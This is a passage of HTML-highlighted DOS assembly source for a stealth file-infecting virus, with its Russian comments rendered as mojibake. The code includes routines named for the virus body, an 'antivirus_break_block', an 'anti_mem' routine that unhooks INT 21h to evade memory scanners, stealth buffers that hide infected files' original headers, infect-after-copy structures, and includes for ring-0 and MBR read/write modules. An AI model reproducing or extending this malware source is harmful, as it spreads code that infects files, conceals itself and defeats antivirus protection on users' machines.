</span><span class="sc0">        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_bx_to_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'/'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_bx_to_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_bx_to_name</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">end_string</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">scan_name</span><span class="sc0">
</span><span class="sc5">end_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;®¯p®£p ¬¬  áp ¢­¥­¨ï ®¤­®© áâp®ª¨ á ­¥áª®«ìª¨¬¨ ¤pã£¨¬¨ ¨§ ¡ §ë</span><span class="sc0">
</span><span class="sc1">;‚å®¤: DS:[SI] áâp®ª  á ª®â®p®© ¡ã¤¥â áp ¢­¨¢ âìáï ­ ¡®p áâp®ª</span><span class="sc0">
</span><span class="sc1">;      ES:[DI] ¡ §  áâp®ª ¢ ä®p¬ â¥:</span><span class="sc0">
</span><span class="sc1">;      db  6,'sergey'</span><span class="sc0">
</span><span class="sc1">;      db  5,'misha'</span><span class="sc0">
</span><span class="sc1">;      db  0ffh  - p¨§­ ª ª®­æ </span><span class="sc0">
</span><span class="sc1">;‚ëå®¤: AX==0 - á®¢¯ ¤¥­¨© ­¥â</span><span class="sc0">
</span><span class="sc1">;       AX!=0 - ­®¬¥p á®¢¯ ¢è¥© áâp®ª¨</span><span class="sc0">
</span><span class="sc5">cmps_string_with_databasestring</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">next_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">no_coincide_string</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">cmpsb</span><span class="sc0">   </span><span class="sc1">; ‘p ¢­¨¢ âì DS:[SI] á ES:[DI]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">coincide_string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">next_string</span><span class="sc0">
</span><span class="sc5">no_coincide_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">coincide_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">al_to_big_letter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0"> </span><span class="sc1">;p¥®¡p §®¢ ­¨¥ ¢ ¡®«ìè¨¥ ¡ãª¢ë</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">this_is_not_bigletter</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">this_is_not_bigletter</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">this_is_not_bigletter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;p®£p ¬¬ë ®¡p ¡®âª¨ á«ãç ©­ëå ç¨á¥«</span><span class="sc0">
</span><span class="sc1">;‚å®¤:  call random_any_ax (‚®p ç¨¢ ¥â «î¡®¥ á«ãç ©­®¥ ç¨á«® ¢ AX)</span><span class="sc0">
</span><span class="sc1">;       call random_ax („«ï ¢å®¤  ­ã¦¥­ AX, ­  ¢ëå®¤¥ 0&lt;NEW_AX&lt;=OLD_AX)</span><span class="sc0">
</span><span class="sc1">;‚å®¤:  call random_any_dx (‚®p ç¨¢ ¥â «î¡®¥ á«ãç ©­®¥ ç¨á«® ¢ DX)</span><span class="sc0">
</span><span class="sc1">;       call random_dx („«ï ¢å®¤  ­ã¦¥­ DX, ­  ¢ëå®¤¥ 0&lt;NEW_DX&lt;=OLD_DX)</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">random.asm</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">antivirus_break_block</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">symbol_to_show</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">length_of_antivirus_break_block</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">antivirus_break_block</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; ®¤¯p®£p ¬¬  áª ­¨p®¢ ­¨ï ¯ ¬ïâ¨.</span><span class="sc0">
</span><span class="sc1">; ‚å®¤:  ES:DI ®âªã¤  áª ­¨p®¢ âì H ¯p¨¬¥p: B800:0001</span><span class="sc0">
</span><span class="sc1">;        CX áª®«ìª® ¬­®£® áª ­¨p®¢ âì (¡ ©âë)</span><span class="sc0">
</span><span class="sc1">;        BX è £ áª ­¨p®¢ ­¨ï (BX=1 - ¯® ¡ ©â­®</span><span class="sc0">
</span><span class="sc1">;                             BX=2 - ç¥p¥§ ¤¢ )</span><span class="sc0">
</span><span class="sc1">;        DS:[SI] - ‘âp®ª  ¢ ä®p¬ â¥ 5,'áâ¥«á' - —â® ¨áª âì</span><span class="sc0">
</span><span class="sc1">;        ‚ áâp®ª¥ ¬®¦­® ã¯®âp¥¡«ïâì á¨¬¢®« "*", ª®â®pë©</span><span class="sc0">
</span><span class="sc1">;        ®¡®§­ ç¥¥â çâ® ¢ íâ®¬ ¬¥áâ¥ ¬®¦¥â áâ®ïâì «î¡®©</span><span class="sc0">
</span><span class="sc1">;        á¨¬¢®«.</span><span class="sc0">
</span><span class="sc1">; ‚ëå®¤: CF=0 ¥á«¨ ­¥ ­ è«¨</span><span class="sc0">
</span><span class="sc1">;        ES:DI - £¤¥ § á¥ª«¨ ¯¥p¢ãî ¡ãª¢ã ¥á«¨ CF=1</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">scan_mem_call</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Gtmp2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'*'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">Gtmp30</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">Gtmp1</span><span class="sc0">
</span><span class="sc5">Gtmp30</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">Gtmp2</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">Gtmp1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">scan_mem_call</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">set_dses_cs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">write_to_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int21_with_use_handle</span><span class="sc0">
</span><span class="sc5">read_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int21_with_use_handle</span><span class="sc0">
</span><span class="sc5">set_lseek_begin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int21_with_use_handle</span><span class="sc0">
</span><span class="sc5">set_lseek_current</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">set_lseek_curent_pluscxdx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int21_with_use_handle</span><span class="sc0">
</span><span class="sc5">set_lseek_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">set_lseek_end_pluscxdx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int21_with_use_handle</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int21_with_use_handle</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; ®pì¡  á ­ ¤¯¨áìî "‚®§¬®¦­® ¢ ¯ ¬ïâ¨ ­ å®¤¨âáï  ªâ¨¢­ë© ¢¨pãá"</span><span class="sc0">
</span><span class="sc1">; ‡ ¤ ç  ã¡p âì INT 21 á manager' </span><span class="sc0">
</span><span class="sc5">anti_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int24</span><span class="sc0">     </span><span class="sc1">; ‘â ¢¨¬ áâ p®¥ 24 ¯à¥àë¢ ­¨¥</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">manager_idle_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">prot16.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">ring0_16.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">rw_mbr.asm</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ END ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">end_crypt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">original_file_info</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">old_first_20_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0C3h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">file_original_size</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">virus_label</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">02Eh</span><span class="sc0">
</span><span class="sc5">length_of_original_file_info</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">original_file_info</span><span class="sc0">
</span><span class="sc5">endvirus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'END'</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;H®¢ë© § £®«®¢®ª</span><span class="sc0">
</span><span class="sc5">new_first_20_byte</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;ãâì ¤® ä ©«®¢ ª®â®pë¥ ¨éãâ ¯® äã­ªæ¨¨ 4F</span><span class="sc0">
</span><span class="sc5">path_for_4F_function</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;ãâì ¤® ä ©«®¢ ª®â®pë¥ ¨éãâ ¯® äã­ªæ¨¨ 714F</span><span class="sc0">
</span><span class="sc5">path_for_714F_function</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;¡é¨© ¡ãää¥à</span><span class="sc0">
</span><span class="sc5">common_buffer</span><span class="sc0">                      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;¥p¢®¥ íâ® TIME(DW), ¯®â®¬ DATE(DW)</span><span class="sc0">
</span><span class="sc5">time_date_of_file</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">real_number_of_readed_bate</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ãää¥p for Stealth function</span><span class="sc0">
</span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">handle_of_infected_file</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;HANDLE ®âªpëâ®£® § p ¦¥­­®£® ä ©« </span><span class="sc0">
</span><span class="sc1">;(0) - ®«¥ á¢®¡®¤­®</span><span class="sc0">
</span><span class="sc5">original_20h_bate_of_infected_file</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;p¨£¨­ «ì­ë¥ 20h ¡ ©â</span><span class="sc0">
</span><span class="sc5">original_size_of_infected_file</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;Original Length of file</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">infect_after_copy</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">handle_of_copy_file</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;HANDLE ‘®§¤ ¢ ¥¬®£® ä ©« </span><span class="sc0">
</span><span class="sc5">file_name_of_copy_file</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;ˆ¬ï ä ©« </span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">number_of_stealth_buffers</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">stealth_buffer_1</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_2</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_3</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_4</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_5</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_6</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_7</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
